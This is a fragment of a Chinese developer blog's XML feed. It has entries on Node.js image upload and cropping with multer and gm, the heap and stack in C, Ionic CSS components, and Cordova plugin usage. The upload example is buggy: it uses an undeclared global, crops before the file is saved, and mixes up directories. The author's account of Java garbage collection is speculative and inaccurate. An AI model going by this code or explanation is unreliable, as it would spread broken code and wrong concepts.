$rootScope.backButtonPressedOnceToExit = false; &#125;, 2000); &#125; &#125; e.preventDefault(); return false; &#125;, 101);]]></content>
      <categories>
        <category>EffectWork</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejs开发总结一]]></title>
    <url>%2F2016%2F12%2F26%2Ffifth%2F</url>
    <content type="text"><![CDATA[图片上传首先我要说个软件，就是ImageMagick，这个很厉害，有需要的可以联系我哦。 今天我要完整地说一下nodejs里面上传图片，包括缩放图片，裁剪图片。首先用到的工具是nodejs，用到的模块是multer,gm。还有一个就是图片工具imageMagick,这个工具很强大。你们可以去了解一下，它也可以作为Java图片的裁剪，专门有jar包。 言归正传，我们先用nodejs搭载一个简单的网站。 取名为app.js 里面的内容为12345var express = require('express'); var app = express(); var testController = require('./testController'); app.post('/dataInpute', testController.dataInput); app.listen(3000); 现在我们有个接受POST请求的API，接着我们做一个中间处理器testController.js123456789101112131415var multer = require('./controllers'); var upload = multer.single('photo'); exports.dataInput = function(req, res) &#123; upload(req, res, function(err) &#123; if (err) &#123; return res.json(&#123; msg: "出错了" &#125;); &#125; console.log(req); return res.json(&#123; msg: "上传成功" &#125;) &#125;); &#125; 再一个就是这个controllers模块，所以我们就在做一个controllers.js123456789101112131415161718192021var multer = require('multer'); var gm = require('gm').subClass(&#123;imageMagick:true&#125;); var storage = multer.diskStorage(&#123; destination: function(req, file, cb) &#123; cb(null, './public/uploads'); gm('./public/images/' + filename).crop(req.body.width, req.body.height, req.body.x, req.body.y).write('./public/images/' + filename, function(err) &#123; if (err) &#123; console.log(err); &#125; &#125;); &#125;, filename: function(req, file, cb) &#123; var fileFormat = (file.originalname).split("."); filename = file.fieldname + '-' + Date.now() + "." + fileFormat[fileFormat.length - 1]; cb(null, filename); &#125; &#125;); var upload = multer(&#123; storage: storage &#125;); module.exports = upload; 这三个文件在同一个目录下，还有图片的存放位置，也设在这个目录，也就是在这个目录再建立public文件夹，再在public里面建立images文件夹。运行app.js就可以进行post请求。现在我们说一说首先你电脑或者服务器必须安装一个imageMagic的工具，这个工具主要用作裁剪，放缩图片用的。紧接这说multer如何上传图片，首先引入multer模块，multer里面有一个diskStorage方法，传一个json语句，json语句是这样的，我目前知道两个name，一个destination，一个是filename，第一个是文件的存放的路径，第二个是文件的命名。然后再把这个定义的方法放入multer方法中，也是json语句参数，最后导出，或者可以直接调用。调用有两种方法，第一个是单图片multer.single(‘photo’)传进来的name一定要与这个里面的photo是一样的。第二个是多图片multer.array(‘photo’,12)差不多就这两种。文件上传后，再来 说说上传的过程中我们应该在哪去修剪图片，本人认为，修剪图片的过程可是要考虑好，因为这之间涉及异步处理，我只列出了单图片，这个很好处理，只要你能提取图片名和这个图片名的路径就可以修改这个图片。说一下修改图片的方法吧！12345gm('./public/images/' + filename).crop(req.body.width, req.body.height, req.body.x, req.body.y).write('./public/images/' + filename, function(err) &#123; if (err) &#123; console.log(err); &#125; &#125;); gm第一个参数是图片路径紧接着调用crop裁剪方法还有一个resize放缩方法，我讲一个裁剪方法，参数1,2是裁剪后图片的宽度和高度，参数3,4是裁剪时的起始横纵坐标。这就是整个上传，裁剪图片的过程 。]]></content>
      <categories>
        <category>NodeJs</category>
        <category>express|图片上传及裁剪</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈一谈内存和栈]]></title>
    <url>%2F2016%2F12%2F26%2Ffourth%2F</url>
    <content type="text"><![CDATA[浅谈堆和栈的区别在计算机领域，堆栈是一个不容忽视的概念。为什么这样说呢？第一，我们编写的c语言程序基本上都用到。第二，针对现如今的发展，不论是软件还是硬件，对内存的充分利用就是一个不小的飞跃，本人认为，写一个好的软件，如果在内存上下了功夫，我相信是很好的。因为内存的速度要比固态硬盘，机械硬盘要快的多，所以在内存上的试探就是一个巨大的提速过程。 闲话不多说，先说两大数据结构堆和栈，栈是一种具有后进先出的数据结构，也就是说后存放的先取，先存放的后取。而堆是一种经过排序的树形数据结构，每个结点都有一个值。通常我们所说的堆的数据结构，是指二叉堆。堆的特点是根结点的值最小（最大），且根结点的两个子树也是一个堆。由于堆的这个特性，常用来实现优先队列，堆的存取是随意。 内存中的堆区和栈区，关于内存分配，我拿c语言来说，一般情况下，程序存放在rom或flash中，运行时需要拷到内存中执行，内存会分别存储不同的信息。内存中的栈区处于相对较高的地址以地址的增长方向为上的话，栈地址是向下增长的。栈中分配局部变量空间，堆区是向上增长的用于分配程序员申请的内存空间。另外还有静态去是分配静态变量，全局变量空间的；只读区是分配常量和程序代码空间的；以及其他分区。 来看一个例子吧！12345678910111213main.c # include&lt;stdio.h&gt; int a=0;全局初始化区 char *p1;全局未初始化区 main()&#123; int b;栈 char s[]="abc";栈 char *p2;栈 char *p3="123456";123456\0在常量区，p3在栈上。 static int c=0;全局(静态) 初始化区 p1=(char *)malloc(10);堆 p2=(char *)malloc(10);堆 &#125; 申请方式和回收方式也不同 申请方式：栈是系统自动分配空间的，例如我们定义一个char a；系统会自动在栈上为其开辟空间。而堆则是程序员根据需要自己申请的空间，例如malloc(10)；开辟十个字节的空间。由于栈上的空间是自动分配回收的，所以栈上的数据的生存周期只是在函数的运行过程中，运行后就释放掉，不可以再访问。而堆上的数据只要程序员不释放空间，就一直可以访问到，不过缺点是一旦忘记释放会造成内存泄漏。 申请后系统的响应 栈：只要栈的剩余空间大于所申请的空间，系统将为程序提供内存，否则将报异常提示栈溢出。 堆：首先应该知道操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆。 结点：然后将该结点从空闲链表中删除，并将该结点的空间分配给程序，另外，对于大多数系统，会在这块内存空间中的首地址出记录本次分配的大小，这样，代码中的delete语句才能正确的释放本内存空间。另外，由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动的将多余的那部分重新放入空闲链表中。 申请效率： 栈：由系统自动分配，速度较快。但程序员是无法控制的。 堆：是由new分配的内存，一般速度比较慢，而且容易产生内存碎片，不过用起来最方便。 堆和栈的存储内容： 栈：在函数调用时，第一个进栈的是主函数中函数调用后的下一条指令(函数调用语句的下一条可执行语句)的地址，然后是函数的各个参数，在大多数c语言编译器中，参数是由右往左入栈的，然后是函数中的局部变量。注意静态变量是不入栈的。 当本次函数调用结束后，局部变量先出栈，然后是参数，最后栈顶指针指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行。 堆：一般是在堆的头部用一个字节存放堆的大小。堆中的具体内容有程序员安排。 由上谈谈java垃圾回收机制刚看了内存的栈和堆，刚好想到了Java的垃圾回收机制。下面说的一切都是本人的想法。 java创造一个对象，对象的地址存在栈中，其真正的对象在堆中，这充分利用了栈是由系统分配，读取速度快的优点。而堆的存储空间比较灵活，也比较大。把这二者结合，只需要把在堆中已经分配的空间首地址写入栈中即可达到两者的共有效果。 至于java的垃圾回收机制，我想也是利用了栈中的自动分配自动回收。当栈中存放的堆中的地址消失时，我们就可以去清楚对应的堆中的内容。这样就完美的实现了垃圾回收机制。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ionic总结二]]></title>
    <url>%2F2016%2F12%2F25%2Fsecond%2F</url>
    <content type="text"><![CDATA[ionic css定义头部Header是固定在屏幕顶部的组件,可以包如标题和左右的功能按钮。1234&lt;!--bar-lignt--&gt;&lt;div class="bar bar-header bar-light"&gt; &lt;h1 class="title"&gt;bar-light&lt;/h1&gt;&lt;/div&gt; 颜色主要有bar-lignt,bar-stable,bar-positive,bar-calm,bar-balanced,bar-energized,bar-assertive,bar-royal,bar-dark.Sub Header同样是固定在顶部，只是是在Header的下面，就算没有写Header这个，Sub Header这个样式也会距离顶部有一个Header的距离。颜色样式同 Header。123456&lt;div class="bar bar-header"&gt; &lt;h1 class="title"&gt;Header&lt;/h1&gt;&lt;/div&gt;&lt;div class="bar bar-subheader"&gt; &lt;h2 class="title"&gt;Sub Header&lt;/h2&gt;&lt;/div&gt; 另外,记住添加has-subheader CSS类到你的 ion-content directive. ionic css定义内容在app里面,Ionic的内容区域是一个可以滚动的窗口. 当你的头部和底部都各自固定在顶和底的时候, 内容区域就会填充满其他的空白区域. ionic css底部Footer 是在屏幕的最下方，可以包含多种内容类型。12345&lt;div class="bar bar-footer"&gt; &lt;button class="button button-clear"&gt;Left&lt;/button&gt; &lt;div class="title"&gt;Title&lt;/div&gt; &lt;button class="button button-clear"&gt;Right&lt;/button&gt;&lt;/div&gt; 此外，如果底部没有标题，但是又需要右边的按钮，你需要在右侧按钮添加 pull-right如:123&lt;div class="bar bar-footer"&gt; &lt;button class="button button-clear pull-right"&gt;Right&lt;/button&gt;&lt;/div&gt; ionic css按钮默认情况下，按钮显示样式为：display: inline-block。还有block选项可以让按钮满宽度显示。123&lt;button class="button"&gt; Default&lt;/button&gt; 按钮的样式有button-light,button-stable,button-positive,button-calm,button-balanced,button-energized,button-assertive,button-royal,button-dark. BlockButtons添加button-block到按钮使按钮以display: block方式显示. 一个block的按钮会100%集成他的父元素的宽度. 在下面这个例子当中, 按钮包含的内容同时也应用了padding, 所以在按钮和显示屏边框之间会有一定的空隙.123&lt;button class="button button-block button-positive"&gt; Block Button&lt;/button&gt; Full Width Block Buttons(满宽度显示按钮)添加 button-full 到按钮不仅将应用 display: block到按钮, 同时还将移除按钮的左右边距, 任何边框圆角也可能被应用. 当按钮需要撑满整个屏幕的时候,这种样式将非常有用. 另外, 按钮的父元素不会 有 padding 被应用.123&lt;button class="button button-full button-positive"&gt; Full Width Block Button&lt;/button&gt; Different Sizes(不同大小的按钮)添加 button-large 到按钮会让按钮变大, 添加 button-small 让它变小.123456&lt;button class="button button-small button-assertive"&gt; Small Button&lt;/button&gt;&lt;button class="button button-large button-positive"&gt; Large Button&lt;/button&gt; Outlined Buttons(只有边框的按钮)添加 button-outline 到按钮以应用空白背景,只有边框按钮的风格.注意: 按钮文字和边框颜色会使用按钮的颜色样式,就是说 button-positive 会使文字和边框变成蓝色,背景却是透明的.123&lt;button class="button button-outline button-positive"&gt; Outlined Button&lt;/button&gt; Clear Buttons(干净的按钮)添加 button-clear 会移除按钮的边框. 注意: 按钮文字和边框颜色会使用按钮的颜色样式,就是说 button-positive 会使文字的颜色变成蓝色,蓝色背景也将会被无边框取代. Icon Buttons(图标按钮)图标能够以子元素的形式被放在按钮内部,不过,直接把图标分配给按钮将减少DOM的数量1234567891011121314151617&lt;button class="button"&gt; &lt;i class="icon ion-loading-c"&gt;&lt;/i&gt; Loading...&lt;/button&gt;&lt;button class="button icon-left ion-home"&gt;Home&lt;/button&gt;&lt;button class="button icon-left ion-star button-positive"&gt;Favorites&lt;/button&gt;&lt;a class="button icon-right ion-chevron-right button-calm"&gt;Learn More&lt;/a&gt;&lt;a class="button icon-left ion-chevron-left button-clear button-dark"&gt;Back&lt;/a&gt;&lt;button class="button icon ion-gear-a"&gt;&lt;/button&gt;&lt;a class="button button-icon icon ion-settings"&gt;&lt;/a&gt;&lt;a class="button button-outline icon-right ion-navicon button-balanced"&gt;Reorder&lt;/a&gt; Button in Headers(头部/底部添加按钮)12345&lt;div class="bar bar-header"&gt; &lt;button class="button icon ion-navicon"&gt;&lt;/button&gt; &lt;h1 class="title"&gt;Header Buttons&lt;/h1&gt; &lt;button class="button"&gt;Edit&lt;/button&gt;&lt;/div&gt; 清除按钮边框12345&lt;div class="bar bar-header"&gt; &lt;button class="button button-icon icon ion-navicon"&gt;&lt;/button&gt; &lt;div class="h1 title"&gt;Header Buttons&lt;/div&gt; &lt;button class="button button-clear button-positive"&gt;Edit&lt;/button&gt;&lt;/div&gt; Button Bar(按钮栏)我们可以使用 button-bar 类来设置按钮栏。以下实例中，我们在头部和内容中添加了按钮栏。12345&lt;div class="button-bar"&gt; &lt;a class="button"&gt;First&lt;/a&gt; &lt;a class="button"&gt;Second&lt;/a&gt; &lt;a class="button"&gt;Third&lt;/a&gt;&lt;/div&gt; ionic css列表列表是一个应用广泛的界面元素，在所有移动app中几乎都会使用到。 列表可以是基本文字、按钮，开关，图标和缩略图等。 列表项可以是任何的HTML元素。容器元素需要list类，每个列表项需要使用item类。 ionList和ionItem可以很容易的支持各种交互方式，比如，滑动编辑，拖动排序，以及删除项。12345&lt;ul class="list"&gt; &lt;li class="item"&gt; ... &lt;/li&gt;&lt;/ul&gt; List Dividers(列表分隔符)我们可以使用 item-divider 类来为列表创建分隔符，默认情况下，列表项以不同的背景颜色和字体加粗来区分，但你也可以很容易的定制他。12345678910111213&lt;div class="list"&gt; &lt;div class="item item-divider"&gt; Candy Bars &lt;/div&gt; &lt;a class="item" href="#"&gt; Butterfinger &lt;/a&gt; ...&lt;/div&gt; List Icons(带图标列表)我们可以在列表项的左侧或右侧指定图标。使用 item-icon-left图标在左侧，item-icon-right 设置图标在右侧。如果你需要在两边都有图标，则两个类都添加上即可。12345678910111213141516171819202122232425262728&lt;div class="list"&gt; &lt;a class="item item-icon-left" href="#"&gt; &lt;i class="icon ion-email"&gt;&lt;/i&gt; Check mail &lt;/a&gt; &lt;a class="item item-icon-left item-icon-right" href="#"&gt; &lt;i class="icon ion-chatbubble-working"&gt;&lt;/i&gt; Call Ma &lt;i class="icon ion-ios-telephone-outline"&gt;&lt;/i&gt; &lt;/a&gt; &lt;a class="item item-icon-left" href="#"&gt; &lt;i class="icon ion-mic-a"&gt;&lt;/i&gt; Record album &lt;span class="item-note"&gt; Grammy &lt;/span&gt; &lt;/a&gt; &lt;a class="item item-icon-left" href="#"&gt; &lt;i class="icon ion-person-stalker"&gt;&lt;/i&gt; Friends &lt;span class="badge badge-assertive"&gt;0&lt;/span&gt; &lt;/a&gt;&lt;/div&gt; List Buttons(按钮列表)使用 item-button-right 或 item-button-left 类将按钮放在列表项中。123456789101112&lt;div class="list"&gt; &lt;div class="item item-button-right"&gt; Call Ma &lt;button class="button button-positive"&gt; &lt;i class="icon ion-ios-telephone"&gt;&lt;/i&gt; &lt;/button&gt; &lt;/div&gt; ...&lt;/div&gt; Item Avatars(带头像列表)使用 item-avatar 来创建一个带头像的列表.1234567891011&lt;div class="list"&gt; &lt;a class="item item-avatar" href="#"&gt; &lt;img src="venkman.jpg"&gt; &lt;h2&gt;Venkman&lt;/h2&gt; &lt;p&gt;Back off, man. I'm a scientist.&lt;/p&gt; &lt;/a&gt; ...&lt;/div&gt; Item Thumbnails(缩略图列表)item-thumbnail-left 类用于添加左侧对齐的缩略图， item-thumbnail-right 类用于添加右侧对齐的缩略图。1234567891011&lt;div class="list"&gt; &lt;a class="item item-thumbnail-left" href="#"&gt; &lt;img src="cover.jpg"&gt; &lt;h2&gt;Pretty Hate Machine&lt;/h2&gt; &lt;p&gt;Nine Inch Nails&lt;/p&gt; &lt;/a&gt; ...&lt;/div&gt; Inset Lists(内嵌列表)我们可以在容器当中内嵌列表，列表不会显示完整的宽度。 内嵌列表的样式为：list list-inset，与常规列表区别是，它设置了外边距（marign）, 类似于选项卡。 内嵌列表是没有阴影效果的，滚动时效果会更好。123456789&lt;div class="list list-inset"&gt; &lt;div class="item"&gt; Raiders of the Lost Ark &lt;/div&gt; ...&lt;/div&gt; Cards(卡片)卡片会根据屏幕大小自适应大小,甚至还可以有动画效果.卡片通常被放在在另一个之上, 但它们也可以被当做”页”来使用,像左滑,右滑.12345&lt;div class="card"&gt; &lt;div class="item item-text-wrap"&gt; This is a basic Card which contains an item that has wrapping text. &lt;/div&gt;&lt;/div&gt; 卡片(card)默认样式带有box-shadow(阴影)，由于性能的原因，和他类似的元素像 list list-inset 并没有阴影。 如果你有很多的卡片，每个卡片都有很多子元素，建议使用内嵌列表 inset lists 。Card Headers and Footers(卡片的头部与底部)我们可以通过添加 item-divider 类为卡片添加头部与底部： 添加带 item-divider 类的 card 的元素在内容区域的上方或者下方.1234567891011&lt;div class="card"&gt; &lt;div class="item item-divider"&gt; I'm a Header in a Card! &lt;/div&gt; &lt;div class="item item-text-wrap"&gt; This is a basic Card with some text. &lt;/div&gt; &lt;div class="item item-divider"&gt; I'm a Footer in a Card! &lt;/div&gt;&lt;/div&gt; Card Lists(卡片列表)使用 list card 类来设置卡片列表：1234567891011121314151617181920212223&lt;div class="list card"&gt; &lt;a href="#" class="item item-icon-left"&gt; &lt;i class="icon ion-home"&gt;&lt;/i&gt; Enter home address &lt;/a&gt; &lt;a href="#" class="item item-icon-left"&gt; &lt;i class="icon ion-ios-telephone"&gt;&lt;/i&gt; Enter phone number &lt;/a&gt; &lt;a href="#" class="item item-icon-left"&gt; &lt;i class="icon ion-wifi"&gt;&lt;/i&gt; Enter wireless password &lt;/a&gt; &lt;a href="#" class="item item-icon-left"&gt; &lt;i class="icon ion-card"&gt;&lt;/i&gt; Enter card information &lt;/a&gt;&lt;/div&gt; Card Images(带图片卡片)123456789101112131415161718&lt;div class="list card"&gt; &lt;div class="item item-avatar"&gt; &lt;img src="avatar.jpg"&gt; &lt;h2&gt;Pretty Hate Machine&lt;/h2&gt; &lt;p&gt;Nine Inch Nails&lt;/p&gt; &lt;/div&gt; &lt;div class="item item-image"&gt; &lt;img src="cover.jpg"&gt; &lt;/div&gt; &lt;a class="item item-icon-left assertive" href="#"&gt; &lt;i class="icon ion-music-note"&gt;&lt;/i&gt; Start listening &lt;/a&gt;&lt;/div&gt; Card Showcase(卡片展现)以下实例中使用几种不同的选项的卡片展现方式。 开始使用了 list card 元素，并使用了 item-avatar , item-body 元素用于展示图片和文本信息，底部使用 item-divider 类。12345678910111213141516171819202122&lt;div class="list card"&gt; &lt;div class="item item-avatar"&gt; &lt;img src="mcfly.jpg"&gt; &lt;h2&gt;Marty McFly&lt;/h2&gt; &lt;p&gt;November 05, 1955&lt;/p&gt; &lt;/div&gt; &lt;div class="item item-body"&gt; &lt;img class="full-image" src="delorean.jpg"&gt; &lt;p&gt; This is a "Facebook" styled Card. The header is created from a Thumbnail List item, the content is from a card-body consisting of an image and paragraph text. The footer consists of tabs, icons aligned left, within the card-footer. &lt;/p&gt; &lt;p&gt; &lt;a href="#" class="subdued"&gt;1 Like&lt;/a&gt; &lt;a href="#" class="subdued"&gt;5 Comments&lt;/a&gt; &lt;/p&gt; &lt;/div&gt;&lt;/div&gt; ionic css表单和输入框]]></content>
      <categories>
        <category>css</category>
        <category>ionic</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cordova平台总结一]]></title>
    <url>%2F2016%2F12%2F25%2Fthird%2F</url>
    <content type="text"><![CDATA[Splashscreen插件显示或隐藏启动屏幕画面123456module.controller('MyCtrl', function($scope, $cordovaSplashscreen) &#123; $cordovaSplashscreen.show();//$cordovaSplashscreen.hide();&#125;); StatusBar插件配置设备的状态栏颜色和样式。12345678910111213141516171819module.controller('MyCtrl', function($cordovaStatusbar) &#123; $cordovaStatusbar.overlaysWebView(true); // 样式: 无 : 0, 白色不透明: 1, 黑色半透明: 2, 黑色不透明: 3 $cordovaStatusbar.style(1); // 背景颜色名字 : black, darkGray, lightGray, white, gray, red, green, // blue, cyan, yellow, magenta, orange, purple, brown 注:需要开启状态栏占用视图. $cordovaStatusbar.styleColor('black'); $cordovaStatusbar.styleHex('#000'); $cordovaStatusbar.hide(); $cordovaStatusbar.show(); var isVisible = $cordovaStatusbar.isVisible();&#125;); Badge修改应用程序图标的角标数量，Android、ios和Windows手机。方法hasPermission()检测是否有修改权限123456789module.controller('MyCtrl', function($cordovaBadge) &#123; $cordovaBadge.hasPermission().then(function(yes) &#123; // 有权限 &#125;, function(no) &#123; // 无权限 &#125;);&#125;); set(badge, callback, scope)设置角标数字123456789module.controller('MyCtrl', function($cordovaBadge) &#123; $cordovaBadge.set(3).then(function() &#123; // 有权限, 已设置. &#125;, function(err) &#123; // 无权限 &#125;);&#125;); get()获取角标数字123456789module.controller('MyCtrl', function($cordovaBadge) &#123; $cordovaBadge.get().then(function(badge) &#123; // 有权限, 已返回. &#125;, function(err) &#123; // 无权限 &#125;);&#125;); clear(callback, scope)清除角标数字123456789module.controller('MyCtrl', function($cordovaBadge) &#123; $cordovaBadge.clear().then(function() &#123; // 有权限, 已清除. &#125;, function(err) &#123; // 无权限 &#125;);&#125;); increase(count, callback, scope)增加角标数字,如果不设置则+1123456789module.controller('MyCtrl', function($cordovaBadge) &#123; $cordovaBadge.increase(10).then(function() &#123; // 有权限, 已增加10. &#125;, function(err) &#123; // 无权限 &#125;);&#125;); decrease(count, callback, scope)减少角标数字,如果不设置则-1123456789module.controller('MyCtrl', function($cordovaBadge) &#123; $cordovaBadge.decrease().then(function(badge) &#123; // 有权限, 已减少10. &#125;, function(err) &#123; // 无权限 &#125;);&#125;); network插件方法getNetwork()提供了一个快速的方法来确定设备的网络连接状态，和类型的连接。 返回值 Connection Object: Connection Type(连接类型) 说明 Connection.UNKNOWN 未知连接 Connection.ETHERNET 以太网连接 Connection.WIFI 无线网连接 Connection.CELL_2G 2G网连接 Connection.CELL_3G 3G网连接 Connection.CELL_4G 4G网连接 Connection.CELL 通用连接 Connection.NONE 无网络连接 isOnline()检测手机网络是否在线 返回值 如果为true手机网络在线isOffline()检测手机网络是否离线 返回值 如果为true手机网络离线事件(Event)$cordovaNetwork:online监听$cordovaNetwork:online当手机上网时触发事件返回值 参数 类型 说明 event Object Angular 事件 $broadcast - 详情查阅 AngularJS docs networkState Object 网络连接类型,具体参考getNetwork()的返回值 $cordovaNetwork:offline监听$cordovaNetwork:offline当手机网络离线时触发事件 参数 类型 说明 event Object Angular 事件 $broadcast - 详情查阅 AngularJS docs networkState Object 网络连接类型,具体参考getNetwork()的返回值 1234567891011121314document.addEventListener("deviceready", function () &#123; // 监听手机网络在线事件 $rootScope.$on('$cordovaNetwork:online', function(event, networkState)&#123; var onlineState = networkState; $rootScope.netState=1; &#125;); // 监听手机网络离线事件 $rootScope.$on('$cordovaNetwork:offline', function(event, networkState)&#123; $cordovaToast.showLongBottom('亲！此应用需要联网\\(^o^)/'); $rootScope.netState=0; &#125;); &#125;, false); Toast插件这个插件可以显示一个像原生Toast(显示一小段文字提示)方法show(message, duration, position)增加一个或多个本地通知 参数 类型 说明 message String 信息提示的一段文字 duration String 信息提示显示持续事件 长或短: ‘short’, ‘long’ position String 信息提示显示的位置顶部,中间,底部: ‘top’, ‘center’,’bottom’ 如果不想填写额外参数可以通过更优雅的方式显示 Toast(提示信息)showShortTop(message) 显示顶部 showShortCenter(message) 显示中间 showShortBottom(message) 显示底部 showLongTop(message) 显示顶部(长时间) showLongCenter(message)显示中间(长时间) showLongBottom(message)显示底部(长时间)1234567891011121314151617181920212223module.controller('MyCtrl', function($cordovaToast) &#123; $cordovaToast .show('ionic中文网', 'long', 'center') .then(function(success) &#123; // success &#125;, function (error) &#123; // error &#125;); $cordovaToast.showShortTop('ionic中文网').then(function(success) &#123; // success &#125;, function (error) &#123; // error &#125;); $cordovaToast.showLongBottom('ionic中文网').then(function(success) &#123; // success &#125;, function (error) &#123; // error &#125;);&#125;) Dialogs插件显示一个系统提示对话框方法alert(message, title, buttonName) 参数 类型 说明 message String 对话框提示的一段文字 title String 对话框标题 默认:alert buttonName String 对话框按钮名称 默认:ok confirm(message, title, buttonArray)显示一个带有指定消息和取消及取消按钮的对话框(可以自定义两个按钮的名称) 参数 类型 说明 message String 对话框提示的一段文字 title String 对话框标题 默认:alert buttonArray Array 按钮名名称 是一个数组 默认:ok,cancel 返回值 Integer 1或2取决于你点击了哪一个按钮prompt(message, title, buttonArray, defaultText)显示可提示用户进行输入的对话框 参数 类型 说明 message String 对话框提示的一段文字 title String 对话框标题 默认:alert buttonArray Array 按钮名名称 是一个数组 默认:ok,cancel defaultText String 用户输入提示信息 返回值 Object 用于接受用户输入:result.input1 判断用户点击那哪一个按钮 返回一个索引:result.buttonIndex beep(repetitions)显示可提示用户进行输入的对话框 参数 类型 说明 repetitions Integer 设置弹出对话框延迟以秒为单位 123456789101112131415161718192021222324module.controller('MyCtrl', function($scope, $cordovaDialogs) &#123; $cordovaDialogs.alert('message', 'title', 'button name') .then(function() &#123; // callback success &#125;); $cordovaDialogs.confirm('message', 'title', ['button 1','button 2']) .then(function(buttonIndex) &#123; // no button = 0, 'OK' = 1, 'Cancel' = 2 var btnIndex = buttonIndex; &#125;); $cordovaDialogs.prompt('msg', 'title', ['btn 1','btn 2'], 'default text') .then(function(result) &#123; var input = result.input1; // no button = 0, 'OK' = 1, 'Cancel' = 2 var btnIndex = result.buttonIndex; &#125;); // beep 3 times $cordovaDialogs.beep(3);&#125;); Pin Dialog数字密码对话框。方法prompt(message) 显示一个可以输入数字密码的对话框|参数|类型|说明||-|-|-||message|String|信息提示的一段文字|12345678910module.controller('MyCtrl', function($cordovaPinDialog) &#123; $cordovaPinDialog.prompt('Some message here').then( function(result) &#123; // result &#125;, function (error) &#123; // error &#125;)&#125;); action Sheet插件显示一个用户可以选择的原生上拉菜单.iOS调用UIActionSheet. Android调用AlertDialog。方法show(options) 参数 类型 说明 options Object Options的选项 Options 类型 说明 title String 标题 buttonLabels String Array 每个按钮的文本，从1开始 addCancelButtonWithLabel String 如果为空，没有取消按钮。否则，设置取消按钮的文字 androidEnableCancelButton Boolean 显示Android取消按钮，默认为假 winphoneEnableCancelButton Boolean 显示IOS取消按钮，默认为假 addDestructiveButtonWithLabel String 添加一个红色的按钮 1234567891011121314151617181920module.controller('ThisCtrl', function($cordovaActionSheet) &#123; var options = &#123; title: '你要做什么?', buttonLabels: ['分享到新浪微博', '分享到朋友圈'], addCancelButtonWithLabel: '取消', androidEnableCancelButton: true, winphoneEnableCancelButton: true, addDestructiveButtonWithLabel: '删除这个' &#125;; document.addEventListener("deviceready", function () &#123; $cordovaActionSheet.show(options) .then(function(btnIndex) &#123; var index = btnIndex; &#125;); &#125;, false);&#125;); Date Picker显示本地日期和时间选择器控件方法show(options)显示一个日期选择器options是一个时间选择器的选项。它是一个Object 参数 类型 默认值 说明 options.mode String ‘date’ 日期选择器模式:date 或者time options.date Date, String new Date() 选择日期 options.minDate Date, String 无 最小日期 options.maxDate Date, String 无 最大日期 options.allowOldDates Boolean true 显示/隐藏早些时候的日期 options.allowFutureDates Boolean true 显示/隐藏以后的的日期 options.doneButtonLabel String Done’ 完成按钮名称 options.doneButtonColor String ‘#0000FF’ 完成按钮颜色16进制代码 options.cancelButtonLabel String ‘Cancel’ 取消按钮名称 options.cancelButtonColor String ‘#000000’ 取消按钮颜色16进制代码 options.minuteInterval Integer 1 选择器间隔时间 返回值 Date 用户选择的时间12345678910111213141516171819202122module.controller('MyCtrl', function($scope, $cordovaDatePicker) &#123; var options = &#123; date: new Date(), mode: 'date', // or 'time' minDate: new Date() - 10000, allowOldDates: true, allowFutureDates: false, doneButtonLabel: 'DONE', doneButtonColor: '#F2F3F4', cancelButtonLabel: 'CANCEL', cancelButtonColor: '#000000' &#125;; document.addEventListener("deviceready", function () &#123; $cordovaDatePicker.show(options).then(function(date)&#123; alert(date); &#125;); &#125;, false);&#125;); native audioCordova / PhoneGap 3.5 +本地音频播放，针对HTML5游戏和音频应用所需的最小延迟，复调和并发。1234567891011121314151617181920212223242526272829303132module.controller('MyCtrl', function($scope, $cordovaNativeAudio, $timeout) &#123; $cordovaNativeAudio .preloadSimple('click', 'audio/click.mp3') .then(function (msg) &#123; console.log(msg); &#125;, function (error) &#123; alert(error); &#125;); $cordovaNativeAudio .preloadComplex('music', 'audio/music.mp3', 1, 1) .then(function (msg) &#123; console.log(msg); &#125;, function (error) &#123; console.error(error); &#125;); $scope.play = function () &#123; $cordovaNativeAudio.play('click'); $cordovaNativeAudio.loop('music'); // stop 'music' loop and unload $timeout(function () &#123; $cordovaNativeAudio.stop('music'); $cordovaNativeAudio.unload('click'); $cordovaNativeAudio.unload('music'); &#125;, 1000 * 60); &#125;;&#125;); Barcode Scanner打开相机自动扫描 条形码/二维码，返回数据。方法scan()返回 对象 - 信息encode(type, text)|参数|类型|说明||-|-|-||type|Constant|编码类型（如：barcodescanner。编码。text_type）||text|String|编码所需的文本字符串|123456789101112131415161718192021222324module.controller('BarcodeCtrl', function($scope, $cordovaBarcodeScanner) &#123; document.addEventListener("deviceready", function () &#123; $cordovaBarcodeScanner .scan() .then(function(barcodeData) &#123; // Success! Barcode data is here 扫描数据：barcodeData.text &#125;, function(error) &#123; // An error occurred &#125;); // NOTE: encoding not functioning yet $cordovaBarcodeScanner .encode(BarcodeScanner.Encode.TEXT_TYPE, "http://www.nytimes.com") .then(function(success) &#123; // Success! &#125;, function(error) &#123; // An error occurred &#125;); &#125;, false);&#125;); Vibration插件使设备震动123456module.controller('MyCtrl', function($scope, $cordovaVibration) &#123; // 震动 100ms $cordovaVibration.vibrate(100);&#125;); SQLite插件调用SQLite本地数据库储存接口1234567891011121314151617module.controller('MyCtrl', function($scope, $cordovaSQLite) &#123; var db = $cordovaSQLite.openDB(&#123; name: "my.db" &#125;); // for opening a background db: var db = $cordovaSQLite.openDB(&#123; name: "my.db", bgType: 1 &#125;); $scope.execute = function() &#123; var query = "INSERT INTO test_table (data, data_num) VALUES (?,?)"; $cordovaSQLite.execute(db, query, ["test", 100]).then(function(res) &#123; console.log("insertId: " + res.insertId); &#125;, function (err) &#123; console.error(err); &#125;); &#125;;&#125;);]]></content>
      <categories>
        <category>cordova</category>
      </categories>
      <tags>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ionic总结一]]></title>
    <url>%2F2016%2F12%2F25%2Ffirst%2F</url>
